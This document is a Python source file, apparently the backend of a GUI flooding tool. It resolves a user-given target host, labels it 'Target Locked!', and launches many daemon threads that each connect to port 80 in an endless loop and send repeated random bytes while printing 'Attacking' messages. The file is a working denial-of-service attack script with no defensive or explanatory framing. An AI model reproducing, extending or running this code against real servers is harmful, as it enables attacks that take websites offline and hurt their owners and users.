from urllib.parse import urlparse
import socket
import random
import threading
import sys

def get_hosts(target):
    t = ""

    if target in "https://" or target == "http://":
        t = target.replace("/", "")
        t = urlparse(target).netloc
        t = '.'.join(t.split('.')[-2:])
    else:
        t = target
    
    return socket.gethostbyname(t)


def event_button_target(customtkinter, app, target):
    if target == "":
        return

    hostName = get_hosts(target)
    
    textReplace = f"{hostName} / Target Locked!"
    text_var = customtkinter.StringVar(value=textReplace)
    lock_label = customtkinter.CTkLabel(app, textvariable=text_var, text_color=("aqua", "aqua"))
    lock_label.place(relx=0.5, rely=0.9, anchor=customtkinter.CENTER)

def attack(host, packet):
    r = random._urandom(10)
    u = 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.send(r)
            for x in range(packet):
                s.send(r)
                u += 1
                print("\033[92mSent: " + str(u) + " \033[94m[-- Attacking " + host + " --]")
        except:
            s.close()
            print("\033[91mNo connection, server maybe down!")

def attack_thread(host, packet, threads):
    host = get_hosts(host)    
    for y in range(threads):
        thred = threading.Thread(target=attack, args=(host, packet,), daemon=True)
        thred.start()

def stop(app):
    app.destroy()
    sys.exit()

def center(window, width, height):
    ws = window.winfo_screenwidth()
    hs = window.winfo_screenheight()
    x = (ws/2) - (width/2)
    y = (hs/2) - (height/2)

    window.geometry('%dx%d+%d+%d' % (width, height, x, y))

def add_input(customtkinter, frame, label, StringVar):
    label = customtkinter.CTkLabel(master=frame, text=label, text_color=("aqua", "aqua"))
    label.pack(padx=10, fill="x", expand=True)

    inputs = customtkinter.CTkEntry(master=frame, width=400, textvariable=StringVar)
    inputs.pack(padx=20, pady=10)


def add_button(customtkinter, frame, text, button_event=None):
    buttons = customtkinter.CTkButton(master=frame, text=text, width=400, command=button_event)
    buttons.pack(padx=20, pady=10)